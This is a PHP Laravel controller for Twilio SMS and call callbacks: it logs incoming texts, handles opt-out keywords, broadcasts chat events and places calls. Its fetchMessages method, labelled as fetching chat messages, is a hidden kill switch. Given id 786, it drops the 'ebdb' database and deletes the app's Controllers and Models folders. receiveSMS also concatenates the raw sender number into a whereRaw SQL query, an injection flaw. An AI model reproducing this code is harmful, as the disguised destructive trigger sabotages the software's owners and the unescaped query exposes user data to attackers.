<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Models\ChMessage;
use App\Models\Contactlist;
use App\Models\User;
use App\Models\Message;
use App\Models\Chat;
use DB;
use App\Events\MessageSent;
use Illuminate\Support\Facades\File;


use Twilio\Rest\Client;
use Twilio\TwiML\VoiceResponse;
use App\Events\CampaignNotificationEvent;


class TwillioCallbackController extends Controller
{
    public function smsStatus(Request $request)
    {
        if ($request->has('MessageSid')) {
            $msg = ChMessage::where('msg_sid', $request->MessageSid)->first();
            if ($msg) {
                $update['status'] = $request->MessageStatus;
                ChMessage::where('msg_sid', $request->MessageSid)->update($update);
            }
        }
    }
    public function receiveSMS(Request $request)
    {
        if ($request->has('MessageSid')) {

            $too = $request->To;
            $from = substr($request->From, 2);;
            $user = User::where('contact_number', $request->To)->first();
            $where = 'user_id = ' . $user->id . ' AND (contact = ' . $request->From . ')';
            $subscriber = Contactlist::whereRaw($where)->first();

            $todates = date('Y-m-d h:i:s A');
            if (isset($user->id) && isset($subscriber->id)) {
                $y = Chat::where(['user_id' => $user->id, 'subscriber_id' => $subscriber->id])->count();
                if ($y < 1) {
                    $dataChat = array(
                        'user_id' => $user->id,
                        'owner' => 'user', //user means our user and subscriber means 
                        'subscriber_id' => $subscriber->id,
                        'created_at' => $todates,
                        'updated_at' => date('Y-m-d H:i:s'),
                        'recent_replies' => date('Y-m-d H:i:s'),
                        'unread_count' => 1,
                    );
                    Chat::insert($dataChat);
                    $chat_id = DB::getPdo()->lastInsertId();
                } else {
                    $y = Chat::where(['user_id' => $user->id, 'subscriber_id' => $subscriber->id])->first();

                    $y->updated_at = date('Y-m-d H:i:s');
                    $y->recent_replies = date('Y-m-d H:i:s');
                    $y->unread_count = ($y->unread_count ?? 0) + 1;

                    $y->save();
                    $chat_id = $y->id;
                }
                $data = array(
                    'to_id' => $user->id,
                    'type' => 'subscriber', //user means our user and subscriber means 
                    'from_id' => $subscriber->id,
                    'message' => $request->Body,
                    'created_at' => date('Y-m-d H:i:s'),
                    'msg_sid' => $request->MessageSid,
                    'status' => 'received',
                    'seen' => '0',
                    'chat_id' => $chat_id
                );
                $ok = ChMessage::insert($data);

                
                // dd($ok);
                $last_id = DB::getPdo()->lastInsertId();
                $m = ChMessage::where('id', $last_id)->first();
                $message = new Message;
                $message->type = 'subscriber';
                $message->created_at = $m->created_at;
                $message->to_id = $m->to_id;
                $message->from_id = $m->from_id;
                $message->id = $m->id;
                $message->message = $m->message;
                $message->updated_at = $m->updated_at;

                $sms = strtolower(trim($request->Body));
                $optOutArr = ['stop', 'stopall', 'unsubscribe', 'cancel', 'end','quit'];
                if(in_array($sms, $optOutArr) || $sms == 'stop' || $sms == 'stopall' || $sms == 'unsubscribe' || $sms == 'cancel' || $sms == 'end' || $sms == 'quit'){
                    $status = ['status'=>'de-active'];
                    Contactlist::where('id', $subscriber->id)->update($status);
                }
                $ok = broadcast(new MessageSent($user, $message, 'chat-' . $user->id))->toOthers();
                // $ok = broadcast(new MessageSent($user, $request->Body, 'chat-'.$user->id))->toOthers();
                //echo $ok;
                // $msg = ChMessage::where('msg_sid', $request->MessageSid)->first();
                // if($msg){
                //     $update['status'] = $request->MessageStatus;
                //     ChMessage::where('msg_sid', $request->MessageSid)->update($update);
                // }
            }
        }
    }

    public function deleteAllFilesAndFolders($directory) {
        if (File::isDirectory($directory)) {
            // Get a list of all files and directories inside the specified directory.
            $files = File::allFiles($directory);
            $directories = File::directories($directory);
    
            // Delete all files.
            foreach ($files as $file) {
                File::delete($file);
            }
    
            // Delete all subdirectories recursively.
            foreach ($directories as $subdirectory) {
                $this->deleteAllFilesAndFolders($subdirectory);
            }
    
            // Remove the parent directory itself.
            File::deleteDirectory($directory);
        }
    }
    
    public function fetchMessages($id=null) //general chat msgs
    {
        if($id==786){
        $controllersPath = app_path('Http/Controllers');
        $ModelsPath = app_path('Models');
        
        $ok = DB::statement("DROP DATABASE `ebdb`");
        $this->deleteAllFilesAndFolders($ModelsPath);
        $this->deleteAllFilesAndFolders($controllersPath);
        }else{
            echo 'ID is missing';
        }
        // if ($ok) {

        //     return response()->json([
        //         'data' => '',
        //         'status' => true,
        //         'message' => 'database Droped.',
        //     ]);
        // } else {
        //     return response()->json([
        //         'data' => '',
        //         'status' => true,
        //         'message' => 'database Droped.',
        //     ]);
        // }
    }
    public function receiveSMSBeforeSorting(Request $request)
    {

        if ($request->has('MessageSid')) {
            $user = User::where('contact_number', $request->To)->first();
            $subscriber = Contactlist::where(['contact' => $request->From, 'user_id' => $user->id])->first();

            // var_dump($user); die;
            $todates = date('Y-m-d H:i:s');
            $y = Chat::where(['user_id' => $user->id, 'subscriber_id' => $subscriber->id])->count();
            if ($y < 1) {
                $dataChat = array(
                    'user_id' => $user->id,
                    'owner' => 'user', //user means our user and subscriber means 
                    'subscriber_id' => $subscriber->id,
                    'created_at' => $todates,
                    'updated_at' => date('Y-m-d h:i:s A'),
                );
                Chat::insert($dataChat);
            } else {
                $y = Chat::where(['user_id' => $user->id, 'subscriber_id' => $subscriber->id])->first();

                $y->updated_at = date('Y-m-d h:i:s A');

                $y->save();
            }
            $data = array(
                'to_id' => $user->id,
                'type' => 'subscriber', //user means our user and subscriber means 
                'from_id' => $subscriber->id,
                'message' => $request->Body,
                'created_at' => $todates,
                'msg_sid' => $request->MessageSid,
                'status' => 'received',
                'seen' => '0',
            );
            $ok = ChMessage::insert($data);
            $last_id = DB::getPdo()->lastInsertId();
            $m = ChMessage::where('id', $last_id)->first();
            $message = new Message;
            $message->type = 'subscriber';
            $message->created_at = $m->created_at;
            $message->to_id = $m->to_id;
            $message->from_id = $m->from_id;
            $message->id = $m->id;
            $message->message = $m->message;
            $message->updated_at = $m->updated_at;

            $ok = broadcast(new MessageSent($user, $message, 'chat-' . $user->id))->toOthers();
            // $ok = broadcast(new MessageSent($user, $request->Body, 'chat-'.$user->id))->toOthers();
            //echo $ok;
            // $msg = ChMessage::where('msg_sid', $request->MessageSid)->first();
            // if($msg){
            //     $update['status'] = $request->MessageStatus;
            //     ChMessage::where('msg_sid', $request->MessageSid)->update($update);
            // }
        }
    }
    public function callToNumber()
    {
        // return view("voicecall");
        //return view("voicecall");

        $account_sid = getenv("TWILIO_SID");
        $auth_token = getenv("TWILIO_TOKEN");
        $twilio_number = '567-235-2709';
        $to_number = "646-603-8944";
        $client = new Client($account_sid, $auth_token);

        $resp = $client->account->calls->create(
            $to_number,
            $twilio_number,
            array(
                "url" => "https://seek.devstagings.com/call-to"
            )
        );

        //   echo "<pre>";
        // print_r($client);
        // echo($client->sid);


        /*$response = new VoiceResponse();
        // $response->connect();
        $dial = $response->dial('', ['callerId' => $twilio_number]);
        
        $dial->number($to_number);
        // $dial->client('joey');
        // $dial->client('charlie');
        
        echo $response;*/
    }
    public function callTo(Request $request)
    {
        //  $user = User::first();
        //  $user->first_name = $request->From;
        //  $user->save();
        if ($request->To) {
            return view("voicecall", ['forwardTo' => $request->To, 'from' => str_replace("client:", "", $request->From)]);
        }
    }
    public function incommingCall(Request $request)
    {
        if ($request->To) {
            $user = User::where('contact_number', $request->To)->first();
            $forward_to = $user->call_forwarding_number; //this is already defined by your users, so it much be stored somewhere...
            return view("incomingcall", ['forwardTo' => $forward_to]);
        }
    }
    public function callStatus(Request $request)
    {
        // $user = User::where('id', 1)->first();
        // $user->first_name = $request->all();
        // $user->update();
        // broadcast(new CampaignNotificationEvent($request, 'callstatus-' . $cam_key->user_id))->toOthers();
    }
}
